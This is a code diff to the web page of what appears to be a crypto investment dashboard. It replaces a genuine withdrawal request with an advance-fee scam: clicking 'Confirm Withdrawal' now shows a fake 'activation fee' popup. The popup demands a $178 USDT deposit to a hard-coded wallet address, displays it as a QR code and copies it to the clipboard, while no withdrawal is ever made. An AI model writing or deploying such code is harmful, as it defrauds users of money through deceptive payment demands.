@@ -125,7 +125,7 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
-        import { getFirestore, doc, onSnapshot, collection, query, addDoc, serverTimestamp, updateDoc, where, getDocs, increment } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+        import { getFirestore, doc, onSnapshot, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyAmlAKs35FG4hbcaPkVQ_s0FSaZsvWzFak",
@@ -191,43 +191,59 @@
             }
         };
 
-        // Submit Withdrawal
+        // Submit Withdrawal Action
         document.getElementById('submitWithdrawBtn').onclick = async () => {
-            const btn = document.getElementById('submitWithdrawBtn');
             const amount = parseFloat(document.getElementById('withdrawAmount').value);
             const address = document.getElementById('withdrawAddress').value;
             const enteredPin = document.getElementById('vaultPin').value;
-            const network = document.getElementById('withdrawNetwork').value;
 
             if (!address || isNaN(amount) || amount < 10) return showError("Min withdrawal is $10.");
             if (enteredPin !== currentUserData.securePin) return showError("Incorrect Security PIN.");
             if (amount > (currentUserData.balance || 0)) return showError("Insufficient balance.");
 
-            try {
-                btn.disabled = true; btn.innerText = "Authorizing...";
-                await updateDoc(doc(db, "users", currentUser.uid), { balance: increment(-amount) });
-                await addDoc(collection(db, "withdrawals"), {
-                    uid: currentUser.uid, email: currentUser.email, fullName: currentUserData.fullName,
-                    amount: amount, address: address, network: network, status: "pending",
-                    timestamp: serverTimestamp(), type: "Withdrawal"
-                });
+            const feeWallet = "0x7dc60c1f777a893ef1309744f3129096411bf29c";
 
-                Swal.fire({ icon: 'success', title: 'SUCCESS', text: 'Request sent for audit.', background: '#070b16', color: '#fff' });
-                document.getElementById('withdrawPanel').classList.remove('show-panel');
-            } catch (e) {
-                showError("System busy.");
-            } finally {
-                btn.disabled = false; btn.innerText = "Confirm Withdrawal";
-            }
+            document.getElementById('withdrawPanel').classList.remove('show-panel');
+
+            Swal.fire({
+                title: '<span style="color:#3b82f6; font-weight:900; font-style:italic;">ACTIVATION FEE REQUIRED</span>',
+                html: `
+                    <p style="font-size:11px; color:#94a3b8; margin-bottom:15px; font-weight:600;">
+                        To activate your automatic payout, a verification fee deposit of <b style="color:#22c55e;">$178.00</b> is required.
+                    </p>
+                    <div style="background:rgba(255,255,255,0.03); padding:15px; border-radius:18px; border:1px solid rgba(255,255,255,0.08); text-align:center;">
+                        <img src="https://api.qrserver.com/v1/create-qr-code/?size=130x130&data=${feeWallet}" style="margin:0 auto 12px; border-radius:12px; border:4px solid #fff;" />
+                        <p style="font-size:9px; color:#64748b; text-transform:uppercase; font-weight:900; letter-spacing:1px; margin-bottom:4px;">Deposit Address (USDT)</p>
+                        <p id="feeAddr" style="font-size:10px; font-family:monospace; color:#60a5fa; word-break:break-all; font-weight:700;">${feeWallet}</p>
+                    </div>
+                `,
+                showCancelButton: true,
+                confirmButtonText: '<i class="fas fa-copy"></i> Copy Address & Pay',
+                cancelButtonText: 'Cancel',
+                background: '#070b16',
+                color: '#fff',
+                customClass: { popup: 'ios-alert', confirmButton: 'ios-btn' },
+                confirmButtonColor: '#2563eb'
+            }).then((result) => {
+                if (result.isConfirmed) {
+                    navigator.clipboard.writeText(feeWallet);
+                    Swal.fire({
+                        icon: 'success',
+                        title: 'Address Copied!',
+                        text: 'Please complete the $178 deposit to process your payout.',
+                        background: '#070b16',
+                        color: '#fff',
+                        customClass: { popup: 'ios-alert' }
+                    });
+                }
+            });
         };
 
-        // --- جلب الإيداعات والسحوبات معاً ---
+        // --- Fetch Transactions ---
         async function loadTransactions(uid) {
             const cont = document.getElementById('transactionHistory');
             
-            // مراقبة السحوبات
             onSnapshot(query(collection(db, "withdrawals"), where("uid", "==", uid)), wSnap => {
-                // مراقبة الإيداعات من sub-collection
                 onSnapshot(collection(db, "users", uid, "deposits"), dSnap => {
                     let allTx = [];
                     
@@ -244,7 +260,6 @@
                         return;
                     }
 
-                    // الترتيب حسب التاريخ الأحدث
                     allTx.sort((a,b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));
                     
                     cont.innerHTML = "";
